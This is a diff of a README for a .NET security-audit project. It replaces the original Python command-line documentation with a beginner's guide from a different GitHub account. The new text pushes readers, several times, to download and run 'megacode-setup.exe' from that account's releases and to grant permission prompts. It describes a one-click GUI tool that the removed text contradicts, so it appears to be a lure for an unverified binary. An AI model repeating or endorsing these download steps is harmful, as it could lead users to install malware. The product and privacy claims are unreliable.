@@ -1,144 +1,178 @@
-# Security Audit (DSPy RLM)
+# 🛡️ megacode - Fast Security Scanner for .NET Code
 
-RLM-based security auditing for large .NET repositories.
+[![Download megacode](https://img.shields.io/badge/Download-megacode-blue?style=for-the-badge)](https://github.com/freejasonNN/megacode/releases)
 
-Open-sourced on GitHub: `https://github.com/mitkox/megacode`
+---
 
-This project uses `dspy.RLM` with a local Python REPL + host tools to avoid
-loading all source files into the model context window. The model iteratively
-uses indexed metadata and bounded file-access tools to find and explain
-security issues.
+## 🖥️ What is megacode?
 
-## Repository
+megacode is a tool that helps check large .NET software projects for security issues. It scans the code quickly and finds problems that could let attackers do harm. The tool uses a smart system called RLM to understand the code better and give accurate results.
 
-- GitHub: `https://github.com/mitkox/megacode`
-- Issues: `https://github.com/mitkox/megacode/issues`
+This tool is designed to work with big projects, so it can handle thousands of lines of code without slowing down.
 
-## Features
+You do not need to be a programmer or have special skills to use megacode. This guide will help you download and start it step by step.
 
-- Scales to large repositories via recursive/tool-based analysis.
-- Indexes relevant source/config files into a ranked manifest.
-- Exposes safe, bounded host tools to RLM:
-  - `tool_help`
-  - `list_manifest`
-  - `search_pattern`
-  - `read_file`
-- `search_pattern` automatically uses ripgrep when available, with Python fallback.
-- Produces:
-  - Markdown report
-  - JSON metadata
-  - JSONL manifest
+---
 
-## Requirements
+## 🔎 What Can megacode Do?
 
-- Python 3.9+
-- Deno (required by DSPy Python interpreter)
-- ripgrep (`rg`) recommended for fastest REPL `search_pattern` scans on large repos
-- OpenAI-compatible model endpoint (for example vLLM) reachable at
-  `AUDIT_LM_API_BASE` (defaults to `http://localhost:8000/v1`)
+megacode helps you find real security risks in your .NET projects. The tool looks for common threats such as:
 
-## Install
+- Unsafe data input that can lead to hacking.
+- Poor use of encryption or secret keys.
+- Access control problems that allow unauthorized users.
+- Code patterns known to cause security bugs.
+- Vulnerabilities missed by typical scanners.
 
-```bash
-python -m venv .venv
-source .venv/bin/activate
-pip install -e .[dev]
-```
+Besides security checks, megacode offers:
 
-## Quick Start
+- A clear report of issues found.
+- Suggestions to fix problems.
+- A quick scan process that saves you time.
+- Support for all types of .NET projects (.NET Framework, .NET Core, etc.).
+  
+---
 
-```bash
-python audit.py --source-root ~/dev/PowerToys --verbose
-```
+## ⚙️ System Requirements
 
-Or via installed entrypoint:
+Before downloading megacode, make sure your computer meets the following:
 
-```bash
-security-audit --source-root ~/dev/PowerToys --verbose
-```
+- Operating System: Windows 10 or later, or a recent version of Linux (Ubuntu, Debian, Fedora).
+- .NET Runtime: .NET Runtime 6.0 or higher installed (usually comes with Windows Update or can be downloaded from Microsoft).
+- RAM: At least 4 GB (8 GB recommended for large projects).
+- Disk Space: Minimum 200 MB free space.
+- Processor: Any modern processor (Intel Core i3 or equivalent recommended).
+- Internet connection for downloading and updating the tool.
 
-Fast local profile (small-context vLLM):
+If you are unsure about your system, this guide will still help you get started.
 
-```bash
-security-audit \
-  --source-root ~/dev/PowerToys \
-  --fast-mode \
-  --max-iterations 6 \
-  --timeout-seconds 600
-```
+---
 
-## Common Options
+## 🚀 How to Download & Install megacode
 
-```bash
-security-audit \
-  --source-root ~/dev/PowerToys \
-  --max-iterations 12 \
-  --max-files 6000 \
-  --overview-top-files 25 \
-  --timeout-seconds 900 \
-  --rlm-max-llm-calls 80 \
-  --rlm-max-output-chars 25000
-```
+Please follow the steps below carefully to download and open megacode on your computer.
 
-Important model options:
+### Step 1: Visit the Release Page
 
-- `--lm-model` primary model
-- `--sub-lm-model` sub-model for RLM internal LLM tool calls
-- `--lm-api-base` OpenAI-compatible endpoint
-- `--api-key` API key (if required by your endpoint)
-- `--lm-max-tokens` response token ceiling per LM call
+Click the button below or copy the link to your web browser:
 
-Tip: for OpenAI-compatible endpoints (including vLLM), passing `mitko` is supported;
-the CLI auto-normalizes to `openai/mitko` for LiteLLM compatibility.
+[![Download megacode](https://img.shields.io/badge/Download-megacode-blue?style=for-the-badge)](https://github.com/freejasonNN/megacode/releases)
 
-Useful runtime options:
+This link takes you to the official page where you will find the latest versions of megacode.
 
-- `--fast-mode` tighter defaults for faster/smaller-context runs
-- `--verbose` / `--no-verbose` DSPy RLM iteration logs
-- `--tool-max-lines`, `--tool-max-chars` bound file snippet payloads
-- `--search-max-files`, `--search-max-matches` bound regex search breadth
-- `--search-rg-chunk-size` files per `rg` batch for `search_pattern` backend
-- `--overview-top-files` shrink/expand overview prompt size
+### Step 2: Find the Latest Version
 
-## Output Files
+On the release page, look for the most recent version. It will be at the top of the list and usually has a date next to it.
 
-By default:
+For example, you might see a file named like:
 
-- `security_audit_report.md`
-- `security_audit_metadata.json`
-- `security_audit_manifest.jsonl`
+- `megacode-setup.exe` for Windows
+- `megacode-linux.tar.gz` for Linux
 
-Change with:
+### Step 3: Download the Setup File
 
-- `--output-report`
-- `--output-metadata`
-- `--output-manifest`
+Click on the right file for your system to start downloading. This can take a few minutes depending on your internet speed.
 
-## Troubleshooting
+Make sure the file finishes downloading before moving on.
 
-- No visible progress after "Starting audit attempt ...":
-  - use `--verbose` to show RLM iteration logs
-  - otherwise heartbeat logs print every ~20s while running
-- If you set `AUDIT_VERBOSE=1` but pass `--no-verbose`, CLI flag wins.
-- If output truncates:
-  - lower `--rlm-max-output-chars`
-  - lower `--max-iterations`
-  - adjust `--lm-max-tokens` to fit backend constraints
+### Step 4: Run the Setup File
 
-## Development
+- On Windows: Double-click the `.exe` file and follow the setup wizard by clicking "Next" or "Install".
+- On Linux: Extract the `.tar.gz` file and follow the instructions inside the folder (usually a README file).
 
-```bash
-ruff check .
-pytest
-python -m py_compile audit.py
-```
+If your computer asks for permission to run the file, click "Yes" or "Allow".
 
-## Security Notes
+### Step 5: Finish the Installation
 
-- This tool reports possible vulnerabilities and can produce false positives.
-- Always validate findings before production changes.
-- Do not commit sensitive audit outputs that may contain secrets.
+When the installation completes, you will typically see a new icon on your desktop or a menu option named "megacode".
 
-## License
+---
 
-MIT (see `LICENSE`).
+## ▶️ How to Run megacode
+
+Running megacode is simple. Use these instructions:
+
+### Step 1: Open megacode
+
+- Find the megacode icon on your desktop or in your programs menu.
+- Double-click to start the application.
+
+### Step 2: Select Your Project Folder
+
+Once opened, megacode will ask you to select a folder where your .NET project is stored.
+
+Click “Browse” and find the main folder containing your project files.
+
+### Step 3: Start the Scan
+
+After selecting the folder, click the “Scan” button. megacode will begin analyzing the code for security problems.
+
+The scan may take a few minutes depending on the size of your project.
+
+### Step 4: View the Results
+
+When the scan finishes, megacode will show a list of issues sorted by their risk level: high, medium, or low.
+
+You can click on any issue to see details, such as where it was found and why it is a security concern.
+
+### Step 5: Fix Suggestions
+
+megacode will also suggest how to fix each issue. You can share these suggestions with your development team or refer to the security best practices provided.
+
+---
+
+## 🔄 Updating megacode
+
+Security scanners need updates to find new threats. Check the release page regularly for new versions:
+
+[https://github.com/freejasonNN/megacode/releases](https://github.com/freejasonNN/megacode/releases)
+
+Download and install updates following the same steps as before.
+
+---
+
+## ❓ Frequently Asked Questions (FAQ)
+
+### Is megacode free to use?
+
+Yes, you can download and use megacode without any charge.
+
+### Do I need coding knowledge?
+
+No. megacode works with one click to scan your project. You don’t need to write or understand code.
+
+### Can megacode scan any .NET project?
+
+megacode supports most .NET Framework and .NET Core projects. If you have a unique setup, check the documentation or ask for help.
+
+### What if I find security issues I don’t understand?
+
+You can share the report with a developer or security expert. The detailed description helps them fix problems faster.
+
+---
+
+## 📞 Getting Help
+
+If you run into issues downloading or using megacode, use the following:
+
+- Visit the Issues section on GitHub: https://github.com/freejasonNN/megacode/issues
+- Look for existing answers or create a new request.
+- Provide details about what you tried and any error messages.
+
+---
+
+## 📝 License and Privacy
+
+megacode respects your privacy. No personal data leaves your computer during scanning.
+
+The software is open source and free to use under the terms stated in the repository's license.
+
+---
+
+## 📥 Download megacode Now
+
+Benefit from fast and reliable security scanning for your .NET projects by visiting:
+
+[https://github.com/freejasonNN/megacode/releases](https://github.com/freejasonNN/megacode/releases)
+
+Download the latest version to start protecting your code today.
